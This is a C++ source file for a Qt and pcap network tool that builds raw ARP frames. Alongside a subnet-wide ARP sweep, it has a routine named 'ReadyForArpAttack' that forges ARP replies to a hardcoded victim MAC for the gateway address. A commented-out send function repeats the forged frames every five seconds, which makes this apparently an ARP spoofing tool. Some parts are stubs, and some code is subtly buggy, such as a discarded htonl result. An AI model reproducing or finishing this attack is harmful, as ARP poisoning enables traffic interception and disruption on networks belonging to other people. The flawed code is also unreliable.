#include "data_packing.h"


data_packing::data_packing(int type)
{
	data_packing_type = type;
	seton_off(0);
	/*QObject::connect(this, SIGNAL(UpdateTips(QString)), tool, SLOT(UpdatingTips(QString)));*/
}

data_packing::~data_packing()
{

}

int data_packing::geton_off()
{
	return on_or_off;
}
void data_packing::seton_off(int i)
{
	on_or_off = i;
}

void data_packing::run()
{
	switch (this->data_packing_type)
	{
	case 0:
		ReadyForArpSeachOne();
		break;
	case 1:
		ReadyForArpSeachAll();
		break;
	case 2:
		ReadyForArpAttack();
		break;
	case 3:
		ReadyForArpDisguise();
		break;
	case 4:
		ReadyForPingOne();
		break;
	case 5:
		ReadyForPingAll();
		break;
	default:
		break;
	}
	MakeArpData();
	SendData();
}
void data_packing::ReadyForArpSeachOne()
{
	for (int i = 0; i <= 5; i++)
	{
		Des_Broad_mac[i] = 0xFF;
	}
	ArpType[0] = 0x08;
	ArpType[1] = 0x06;

	My_mac[0] = 0xD0;
	My_mac[1] = 0x57;
	My_mac[2] = 0x7B;
	My_mac[3] = 0x98;
	My_mac[4] = 0x5A;
	My_mac[5] = 0xF8;
	htonl(My_Int_type_Ip);
	memcpy(My_Char_type_Ip, &My_Int_type_Ip, sizeof(My_Int_type_Ip));
}

void data_packing::ReadyForArpSeachAll()
{
	for (int i = 0; i <= 5; i++)
	{
		Des_Broad_mac[i] = 0xFF;
	}
	ArpType[0] = 0x08;
	ArpType[1] = 0x06;

	My_mac[0] = 0xD0;
	My_mac[1] = 0x57;
	My_mac[2] = 0x7B;
	My_mac[3] = 0x98;
	My_mac[4] = 0x5A;
	My_mac[5] = 0xF8;
	htonl(My_Int_type_Ip);
	memcpy(My_Char_type_Ip, &My_Int_type_Ip, sizeof(My_Int_type_Ip));

}

void data_packing::ReadyForArpAttack()
{
	Des_Broad_mac[0] = 0xbc;
	Des_Broad_mac[1] = 0x46;
	Des_Broad_mac[2] = 0x99;
	Des_Broad_mac[3] = 0x5c;
	Des_Broad_mac[4] = 0x5d;
	Des_Broad_mac[5] = 0xf4;

	ArpType[0] = 0x08;
	ArpType[1] = 0x06;
	
	My_mac[0] = 0xD0;
	My_mac[1] = 0x57;
	My_mac[2] = 0x7B;
	My_mac[3] = 0x98;
	My_mac[4] = 0x5A;
	My_mac[5] = 0xF8;

}

void data_packing::ReadyForArpDisguise()
{

}

void data_packing::ReadyForPingOne()
{

}

void data_packing::ReadyForPingAll()
{

}



void data_packing::MakeArpData()
{

	if (data_packing_type==1||data_packing_type==0)
	{
		QByteArray My_Arp_data;
	    My_Arp_data.clear();
	    char ArpReqData[8];
	    memset(ArpReqData,0,8);
	    int index = 0;
	    ArpReqData[index] = 0x00;
	    index++;
	    ArpReqData[index] = 0x01;
	    index++;
	    ArpReqData[index] = 0x08;
	    index++;
	    ArpReqData[index] = 0x00;
	    index++;
	    ArpReqData[index] = 0x06;
        index++;
	    ArpReqData[index] = 0x04;
	    index++;
	    ArpReqData[index] = 0x00;
	    index++;
	    ArpReqData[index] = 0x01;

		Des_mac[0] = 0;
		Des_mac[1] = 0;
		Des_mac[2] = 0;
		Des_mac[3] = 0;
		Des_mac[4] = 0;
		Des_mac[5] = 0;
	
	    My_Arp_data.append(Des_Broad_mac, 6);
	    My_Arp_data.append(My_mac, 6);
	    My_Arp_data.append(ArpType, 2);
	    My_Arp_data.append(ArpReqData, 8);
	    My_Arp_data.append(My_mac, 6);
	    My_Arp_data.append(My_Char_type_Ip, 4);	  
	    My_Arp_data.append(Des_mac, 6);
		if (data_packing_type==1)
		{
			memset(Goal_Ip, 0, 4);
			memcpy(Goal_Ip, &My_Int_type_Ip, sizeof(My_Int_type_Ip));
			for (int i = 1; i <= 254; i++)
			{
				Goal_Ip[3] = i;
				if (i == 1)
				{
					My_Arp_data.append(Goal_Ip, 4);
				}
				else
				{
					My_Arp_data.replace(38, 4, Goal_Ip, 4);
				}

				My_Sending_data.insert(i - 1, My_Arp_data);
			}
			
		}
		My_Arp_data.append(Goal_Ip, 4);
		My_Sending_data.insert(0, My_Arp_data);
		
	}

	if (data_packing_type==2)
	{
		QByteArray My_Arp_data;
		My_Arp_data.clear();
		char ArpReqData[8];
		memset(ArpReqData, 0, 8);
		int index = 0;
		ArpReqData[index] = 0x00;
		index++;
		ArpReqData[index] = 0x01;
		index++;
		ArpReqData[index] = 0x08;
		index++;
		ArpReqData[index] = 0x00;
		index++;
		ArpReqData[index] = 0x06;
		index++;
		ArpReqData[index] = 0x04;
		index++;
		ArpReqData[index] = 0x00;
		index++;
		ArpReqData[index] = 0x02;

		Des_mac[0] = 0xbc;
		Des_mac[1] = 0x46;
		Des_mac[2] = 0x99;
		Des_mac[3] = 0x5c;
		Des_mac[4] = 0x5d;
		Des_mac[5] = 0xf4;

		My_Arp_data.append(Des_Broad_mac, 6);
		My_Arp_data.append(My_mac, 6);
		My_Arp_data.append(ArpType, 2);
		My_Arp_data.append(ArpReqData, 8);
		My_Arp_data.append(My_mac, 6);
		My_Arp_data.append(My_Char_type_Ip, 4);
		My_Arp_data.append(Des_mac, 6);
		memcpy(Goal_Ip,My_Char_type_Ip,4);
		Goal_Ip[3] = 1;
		My_Arp_data.append(Goal_Ip, 4);
		My_Sending_data.insert(0, My_Arp_data);
	}



}

//int data_packing::SendData()
//{
//	QByteArray data;
//	data.clear();
//
//
//
//
//
//	if (data_packing_type == 1 || data_packing_type == 5)
//	{
//		for (int i = 0; i <= My_Sending_data.count(); i++)
//		{
//
//			data = My_Sending_data.value(i);
//			if (data.count() == 0)
//			{
//				tishi = "senddata is 0";
//			}
//			if (pcap_sendpacket(fp, (u_char*)data.data(), data.count()) != 0)
//			{
//				tishi = "fasongshibai ";
//
//			}
//			else
//			{
//				tishi = "fasong chenggong";
//			}
//		}
//	}
//	else
//	{
//		data = My_Sending_data.value(0);
//		if (data.count() == 0)
//		{
//			tishi = "senddata is 0";
//		}
//		else
//		{
//			while (on_or_off)
//			{
//				if (pcap_sendpacket(fp, (u_char*)data.data(), data.count()) != 0)
//				{
//					tishi = "fasongshibai ";
//
//				}
//				Sleep(5000);
//			}
//
//		}
//
//	}
//
//
//	pcap_freealldevs(alldevs);
//
//
//
//	return 1;
//}

